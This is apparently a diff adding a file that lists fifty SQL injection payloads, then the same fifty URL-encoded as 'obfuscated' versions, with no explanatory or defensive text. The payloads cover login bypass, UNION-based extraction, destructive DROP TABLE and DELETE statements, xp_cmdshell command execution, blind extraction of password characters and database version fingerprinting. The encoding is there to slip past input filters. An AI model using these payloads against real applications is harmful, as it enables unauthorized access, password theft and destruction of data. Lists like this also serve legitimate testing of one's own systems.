@@ -1,0 +1,105 @@
+**Original Payloads**
+
+1.  `' OR '1'='1'`
+2.  `" OR "1"="1"`
+3.  `' OR 1=1 --`
+4.  `" OR 1=1 --`
+5.  `' OR 'a'='a'`
+6.  `" OR "a"="a"`
+7.  `' UNION SELECT null, null --`
+8.  `" UNION SELECT null, null --`
+9.  `' UNION SELECT 1,2,3 --`
+10. `" UNION SELECT 1,2,3 --`
+11. `'; DROP TABLE users; --`
+12. `"; DROP TABLE users; --`
+13. `'; DELETE FROM users; --`
+14. `"; DELETE FROM users; --`
+15. `' OR id LIKE '%1%' --`
+16. `" OR id LIKE '%1%' --`
+17. `'+(SELECT password FROM users WHERE id=1) --`
+18. `"+(SELECT password FROM users WHERE id=1) --`
+19. `' AND 1=1`
+20. `" AND 1=1`
+21. `' AND 1=2`
+22. `" AND 1=2`
+23. `'); EXEC master..xp_cmdshell 'dir'--`
+24. `"); EXEC master..xp_cmdshell 'dir'--`
+25. `'; WAITFOR DELAY '0:0:5' --`
+26. `"; WAITFOR DELAY '0:0:5' --`
+27. `' OR SLEEP(5) --`
+28. `" OR SLEEP(5) --`
+29. `' AND (SELECT * FROM users WHERE username LIKE '%admin%')`
+30. `" AND (SELECT * FROM users WHERE username LIKE '%admin%')`
+31. `' AND substring(password,1,1)='a'`
+32. `" AND substring(password,1,1)='a'`
+33. `' OR 1=1 LIMIT 1 --`
+34. `" OR 1=1 LIMIT 1 --`
+35. `' AND (SELECT COUNT(*) FROM users)>0 --`
+36. `" AND (SELECT COUNT(*) FROM users)>0 --`
+37. `' AND EXISTS (SELECT * FROM users)`
+38. `" AND EXISTS (SELECT * FROM users)`
+39. `' AND ASCII(substring(password,1,1))>100 --`
+40. `" AND ASCII(substring(password,1,1))>100 --`
+41. `' AND ORD(substring(password,1,1))>100 --`
+42. `" AND ORD(substring(password,1,1))>100 --`
+43. `'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 0 END --`
+44. `"; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 0 END --`
+45. `' AND (SELECT version()) LIKE '%PostgreSQL%'`
+46. `" AND (SELECT version()) LIKE '%PostgreSQL%'`
+47. `' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE '%Oracle%'`
+48. `" AND (SELECT banner FROM v$version WHERE rownum=1) LIKE '%Oracle%'`
+49. `' AND (SELECT @@version) LIKE '%MySQL%'`
+50. `" AND (SELECT @@version) LIKE '%MySQL%'`
+
+**Obfuscated Payloads**
+
+1.  `%27%20OR%20%271%27%3D%271%27`
+2.  `%22%20OR%20%221%22%3D%221%22`
+3.  `%27%20OR%201%3D1%20--`
+4.  `%22%20OR%201%3D1%20--`
+5.  `%27%20OR%20%27a%27%3D%27a%27`
+6.  `%22%20OR%20%22a%22%3D%22a%22`
+7.  `%27%20UNION%20SELECT%20null%2C%20null%20--`
+8.  `%22%20UNION%20SELECT%20null%2C%20null%20--`
+9.  `%27%20UNION%20SELECT%201%2C2%2C3%20--`
+10. `%22%20UNION%20SELECT%201%2C2%2C3%20--`
+11. `%27%3B%20DROP%20TABLE%20users%3B%20--`
+12. `%22%3B%20DROP%20TABLE%20users%3B%20--`
+13. `%27%3B%20DELETE%20FROM%20users%3B%20--`
+14. `%22%3B%20DELETE%20FROM%20users%3B%20--`
+15. `%27%20OR%20id%20LIKE%20%27%251%25%27%20--`
+16. `%22%20OR%20id%20LIKE%20%22%251%25%22%20--`
+17. `%27%2B(SELECT%20password%20FROM%20users%20WHERE%20id%3D1)%20--`
+18. `%22%2B(SELECT%20password%20FROM%20users%20WHERE%20id%3D1)%20--`
+19. `%27%20AND%201%3D1`
+20. `%22%20AND%201%3D1`
+21. `%27%20AND%201%3D2`
+22. `%22%20AND%201%3D2`
+23. `%27%29%3B%20EXEC%20master..xp_cmdshell%20%27dir%27--`
+24. `%22%29%3B%20EXEC%20master..xp_cmdshell%20%27dir%27--`
+25. `%27%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20--`
+26. `%22%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20--`
+27. `%27%20OR%20SLEEP(5)%20--`
+28. `%22%20OR%20SLEEP(5)%20--`
+29. `%27%20AND%20(SELECT%20*%20FROM%20users%20WHERE%20username%20LIKE%20%27%25admin%25%27)`
+30. `%22%20AND%20(SELECT%20*%20FROM%20users%20WHERE%20username%20LIKE%20%22%25admin%25%22)`
+31. `%27%20AND%20substring(password%2C1%2C1)%3D%27a%27`
+32. `%22%20AND%20substring(password%2C1%2C1)%3D%22a%22`
+33. `%27%20OR%201%3D1%20LIMIT%201%20--`
+34. `%22%20OR%201%3D1%20LIMIT%201%20--`
+35. `%27%20AND%20(SELECT%20COUNT(*)%20FROM%20users)%3E0%20--`
+36. `%22%20AND%20(SELECT%20COUNT(*)%20FROM%20users)%3E0%20--`
+37. `%27%20AND%20EXISTS%20(SELECT%20*%20FROM%20users)`
+38. `%22%20AND%20EXISTS%20(SELECT%20*%20FROM%20users)`
+39. `%27%20AND%20ASCII(substring(password%2C1%2C1))%3E100%20--`
+40. `%22%20AND%20ASCII(substring(password%2C1%2C1))%3E100%20--`
+41. `%27%20AND%20ORD(substring(password%2C1%2C1))%3E100%20--`
+42. `%22%20AND%20ORD(substring(password%2C1%2C1))%3E100%20--`
+43. `%27%3B%20SELECT%20CASE%20WHEN%20(1%3D1)%20THEN%20pg_sleep(5)%20ELSE%200%20END%20--`
+44. `%22%3B%20SELECT%20CASE%20WHEN%20(1%3D1)%20THEN%20pg_sleep(5)%20ELSE%200%20END%20--`
+45. `%27%20AND%20(SELECT%20version())%20LIKE%20%27%25PostgreSQL%25%27`
+46. `%22%20AND%20(SELECT%20version())%20LIKE%20%22%25PostgreSQL%25%22`
+47. `%27%20AND%20(SELECT%20banner%20FROM%20v%24version%20WHERE%20rownum%3D1)%20LIKE%20%27%25Oracle%25%27`
+48. `%22%20AND%20(SELECT%20banner%20FROM%20v%24version%20WHERE%20rownum%3D1)%20LIKE%20%22%25Oracle%25%22`
+49. `%27%20AND%20(SELECT%20%40%40version)%20LIKE%20%27%25MySQL%25%27`
+50. `%22%20AND%20(SELECT%20%40%40version)%20LIKE%20%22%25MySQL%25%22`
